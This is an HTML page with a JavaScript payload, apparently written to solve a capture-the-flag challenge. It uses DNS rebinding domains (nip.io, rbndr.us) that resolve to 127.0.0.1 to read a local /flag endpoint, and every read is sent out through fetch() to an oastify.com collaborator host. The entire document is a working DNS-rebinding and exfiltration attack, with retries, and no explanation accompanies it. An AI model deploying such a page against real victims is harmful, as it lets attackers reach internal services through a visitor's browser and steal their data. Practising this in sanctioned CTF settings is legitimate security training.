<!DOCTYPE html>
<html>
<body>
<script>
const COLLAB = 'nb26dhz6rohc4mb4y017kpjquh0ao3cs.oastify.com';

// Use DNS rebinding services that point to the ACTUAL target
const rebindDomains = [
    'http://www.chaitanyactf.me.127.0.0.1.nip.io/flag',
    'http://chaitanyactf.7f000001.9df01723.rbndr.us/flag',
    'http://www.chaitanyactf.me.7f000001.rbndr.us/flag'
];

let attempt = 0;

function attack() {
    attempt++;
    const target = rebindDomains[attempt % rebindDomains.length];
    
    fetch(`https://${COLLAB}/?attempt=${attempt}&target=${btoa(target)}`);
    
    fetch(target)
        .then(r => r.text())
        .then(data => {
            if(data && data.length > 0) {
                fetch(`https://${COLLAB}/?flag=${encodeURIComponent(data)}`);
                document.body.innerHTML = `<h1>FLAG: ${data}</h1>`;
            } else {
                throw new Error('No data');
            }
        })
        .catch(e => {
            if(attempt < 10) setTimeout(attack, 2000);
        });
}

attack();
</script>
</body>
</html>
